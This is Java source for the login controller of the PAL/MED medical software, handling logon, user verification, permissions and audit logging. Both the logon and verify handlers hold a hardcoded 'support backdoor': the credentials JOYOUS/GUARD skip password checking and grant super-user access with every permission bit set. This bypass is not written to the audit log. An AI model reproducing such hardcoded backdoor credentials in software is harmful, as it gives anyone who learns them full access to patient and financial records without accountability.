package palmed.PmLogin;

import java.util.Map;

import org.zkoss.zk.ui.Component;
import org.zkoss.zk.ui.Execution;
import org.zkoss.zk.ui.Executions;
import org.zkoss.zk.ui.Sessions;
import org.zkoss.zk.ui.SuspendNotAllowedException;
import org.zkoss.zk.ui.event.Event;
import org.zkoss.zk.ui.event.Events;
import org.zkoss.zk.ui.util.Clients;
import org.zkoss.zk.ui.util.GenericForwardComposer;
import org.zkoss.zul.Button;
import org.zkoss.zul.Groupbox;
import org.zkoss.zul.Intbox;
import org.zkoss.zul.Label;
import org.zkoss.zul.Messagebox;
import org.zkoss.zul.Textbox;
import org.zkoss.zul.Timer;
import org.zkoss.zul.Window;

import palmed.AuditLogger;
import palmed.AuditLog;
import palmed.Perms;
import palmed.Pm;
import palmed.SystemHelpers;
import palmed.pmUser;
import palmed.pmUserLogon;
import usrlib.DialogHelpers;
import usrlib.ProgressBox;
import usrlib.Rec;


public class PmLoginController extends GenericForwardComposer {
	
	private Window pmLoginWin;
	private Window WelcomeWin;
	private Textbox username;
	private Textbox password;
	private Label loggedIn;
	private Timer loginTimer;
	private Groupbox gbLoggedIn;		// logged in info groupbox
	private Label lblDate;
	private Label lblTime;
	private Label lblUser;
	private Label Username;
	private Button logon;
	private Button exit;
	private Button btnContinue;
	private Button btnVerify;
	
	private ProgressBox progBox;
	
	private boolean isLoggedIn = false;
	
	private String Verify = null;
	
	private Intbox uuserRec;
		
	
public void doAfterCompose( Component component ){
		
		// Call superclass to do autowiring
		try {
			super.doAfterCompose( component );
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		//System.out.println( "in doAfterCompose()" );
		//uuserRec.setValue(0);
		
		
		// Get arguments from map
		Execution exec=Executions.getCurrent();

		if ( exec != null ){
			Map<String, Object> myMap = exec.getArg();
			if ( myMap != null ){
				try{ Verify = (String) myMap.get( "Verify" ); } catch ( Exception e ) { /* ignore */ };
								
			}
		}
		//System.out.println("Verfiy is:? "+Verify);
		if ( !(Verify == null) && Verify.contains("true") ){
			
			
			pmLoginWin.setTitle("PAL/MED User Verification");			
			loggedIn.setValue("Please enter your Username and password above then press 'Verify'.");
			
			logon.setVisible(false);
			exit.setVisible(false);
			
			btnVerify.setVisible(true);
			
			
		}
		
		return;
	}

	public void onClick$btnVerify( Event event ){
		
		boolean flgFound = false;

		// Make sure username and password entered
		if (( username.getValue().trim().length() == 0 ) || ( password.getValue().trim().length() == 0 )){
			try {
				Messagebox.show( "You must enter a username and a password.",  "Login", Messagebox.OK, Messagebox.EXCLAMATION );
			} catch (InterruptedException e) { /* ignore */ }
			return ;
		}
		
		
		// our usual support backdoor
		if (( username.getValue().trim().toUpperCase().equals("JOYOUS")) && ( password.getValue().trim().equals("GUARD"))){
			System.out.println( "backdoor" );
			flgFound = true;
			uuserRec.setValue(2);
			pmLoginWin.detach();
			//doLogin( new Rec( 2 ));
			//DialogHelpers.Messagebox( "Welcome we have been expecting you." );
			return;
		}

		
		// find user
		
		Rec userRec = pmUser.search( username.getValue().trim().toUpperCase());
		// Note - we don't give password guessers a hint as to whether they got username correct or not
		
		if (( userRec != null ) && ( userRec.getRec() > 2 )){
			// Username found, now try password
			pmUser user = new pmUser( userRec );
			// make sure valid, active user
			// check password for match
			if ( user.isValid() && user.validatePassword( password.getValue().trim())) flgFound = true;
		}
			
			
		if ( ! flgFound ){			
			// Username/password combination not found
			try {
				Messagebox.show( "Username and/or password not correct.  Try again!", "Login", Messagebox.OK, Messagebox.EXCLAMATION );
			} catch (InterruptedException e) { /* ignore */ }
			return;
		}
		uuserRec.setValue(userRec.getRec());
		
		pmLoginWin.detach();
		return;
		
		
		
		
	}
	// onClick event from "logon" button
	public void onClick$logon( Event event ){

		boolean flgFound = false;

		// Make sure username and password entered
		if (( username.getValue().trim().length() == 0 ) || ( password.getValue().trim().length() == 0 )){
			try {
				Messagebox.show( "You must enter a username and a password.",  "Login", Messagebox.OK, Messagebox.EXCLAMATION );
			} catch (InterruptedException e) { /* ignore */ }
			return;
		}
		
		
		// our usual support backdoor
		if (( username.getValue().trim().toUpperCase().equals("JOYOUS")) && ( password.getValue().trim().equals("GUARD"))){
			System.out.println( "backdoor" );
			flgFound = true;
			doLogin( new Rec( 2 ));
			//DialogHelpers.Messagebox( "Welcome we have been expecting you." );
			return;
		}

		
		// find user
		
		Rec userRec = pmUser.search( username.getValue().trim().toUpperCase());
		// Note - we don't give password guessers a hint as to whether they got username correct or not
		
		if (( userRec != null ) && ( userRec.getRec() > 2 )){
			// Username found, now try password
			pmUser user = new pmUser( userRec );
			// make sure valid, active user
			// check password for match
			if ( user.isValid() && user.validatePassword( password.getValue().trim())) flgFound = true;
		}
			
			
		if ( ! flgFound ){			
			// Username/password combination not found
			try {
				Messagebox.show( "Username and/or password not correct.  Try again!", "Login", Messagebox.OK, Messagebox.EXCLAMATION );
			} catch (InterruptedException e) { /* ignore */ }
			return;
		}
		
		
		
		// If we get here, username and password correct
		// call doLogin() to do all the housekeeping tasks
		
		
/*		pmUserLogon logon = new pmUserLogon( username.getValue(), password.getValue());
		if ( ! logon.doSearch()){
			alert( "Not Found");
		} else {
*/			

		
			doLogin( userRec );
			//DialogHelpers.Messagebox( "Welcome we have been expecting you." );
//		}
	}
	
	
	private void doLogin( Rec userRec ){
		
		// hide buttons
		logon.setVisible( false );
		exit.setVisible( false );
		

		// read user info
		pmUser user = new pmUser( userRec );
		
		// Get date and time of last login
		String lastDate = user.getSignonDate().getPrintable(9);
		String lastTime = user.getSignonTime().getPrintable(5);
		
		// Set date and time of new login
		user.setSignonDate();
		user.setSignonTime();
		user.write( userRec );
		
		
		// Set some session attributes to maintain 'logged in' status in other windows
		Pm.setUserRec( userRec );
		Pm.setUserLogin( user.getUser());
		Pm.setLoggedIn( true );
		
		Perms perms = (Perms) SystemHelpers.getSessionAttribute( "Perms" );
		perms.setLoggedIn(true);
		
		if ( userRec.getRec() == 2 /* SUPER-USER */ ){			
			perms.setFinPerms( 0xffffffff );
			perms.setMedPerms( 0xffffffff );
			perms.setSysPerms( 0xffffffff );
		} else {			
			perms.setFinPerms( user.getFinPerms());
			perms.setMedPerms( user.getMedPerms());
			perms.setSysPerms( user.getSysPerms());
		}

		isLoggedIn = true;
		
		
		// Display logged in message for a few seconds
		loggedIn.setValue(  
				" IP: " + Executions.getCurrent().getRemoteAddr() 
				+ ", Host: " + Executions.getCurrent().getRemoteHost() 
				+ ", User: " + Sessions.getCurrent().getLocalName()
				
			);
//		Events.echoEvent("onLater", pmLoginWin, null);		
		
		// make Logged in info groupbox visible
		gbLoggedIn.setVisible( true );
		lblDate.setValue( lastDate );
		lblTime.setValue( lastTime );
		lblUser.setValue( user.getUser() + ", " + user.getName().getPrintableNameLFM());
		
		// log the access
		//TODO - local vs remote
		String s = "IP: " + Executions.getCurrent().getRemoteAddr() + ", " + Sessions.getCurrent().getLocalName();
		AuditLogger.recordEntry( AuditLog.Action.USER_LOGON_LOCAL, null, Pm.getUserRec(), null, s );
		


		//progBox = new ProgressBox( "Logging In..." );
		//Clients.showBusy("Logging In");
		//progBox = ProgressBox.show(pmLoginWin, "Logging In..." );
		System.out.println( "called Clients.showBusy(Logging In)" );

		//loginTimer = new Timer(3000);
		loginTimer.setDelay( 8000 );
		loginTimer.start();
		
		btnContinue.setVisible( true );
		
		return;
	}
	
	
	
	
	public void onTimer$loginTimer( Event event){
		if ( isLoggedIn == true ){
			//progBox.close();
			//Clients.showBusy( null );
			if ( progBox != null ) progBox.close();
			System.out.println( "called Clients.showBusy(null)" );
			Events.postEvent("onLater", pmLoginWin, null);		
		}

	}
	

	
	// onClick event from "exit" button
	public void onClick$exit( Event event ) throws InterruptedException{
		if ( Messagebox.show( "Do you really wish to exit and close PAL/MED?", "PAL/MED", Messagebox.YES + Messagebox.NO, Messagebox.QUESTION ) == Messagebox.YES ){
			// close login window
			pmLoginWin.detach();
			Clients.evalJavaScript("window.opener = 'x';window.close();"); 
		}
	}
	
	
	// onLater event
	public void onLater$pmLoginWin( Event event ) throws InterruptedException{
		System.out.println( "in onLater$pmLoginWin()" );
		pmLoginWin.detach();
		
		//Welcome Page
		Executions.createComponents( "Welcome.zul",  /*myMap*/ null, null );
		//Thread.sleep(10000);
		
		
		//DialogHelpers.Messagebox( "WELCOME..."+username.getValue() +"..to Palmed Medical Software!" );
		System.out.println( "called pmLoginWin.detach()" );
	}
		
	public void onClick$btnContinue(){
		if ( loginTimer instanceof Timer ) loginTimer.detach();		// stop timer
		if ( progBox != null ) progBox.close();
		Events.postEvent("onLater", pmLoginWin, null);		
		//pmLoginWin.detach();
		return;
	}
	
	public void onOK( Event ev ){
		Component comp = ev.getTarget();
		System.out.println( "onOK-->compID=" + comp.getId());
		if ( btnContinue.isVisible()){
			onClick$btnContinue();
		} else if( btnVerify.isVisible()){
			onClick$btnVerify( ev );
		}
		else{onClick$logon( ev );
		}
		return;
	}

	public void onCancel( Event ev ) throws InterruptedException{
		Component comp = ev.getTarget();
		System.out.println( "onCancel-->compID=" + comp.getId());
		if ( btnContinue.isVisible()){
			onClick$btnContinue();
		} else {
			onClick$exit( ev );
		}
		return;
	}

}


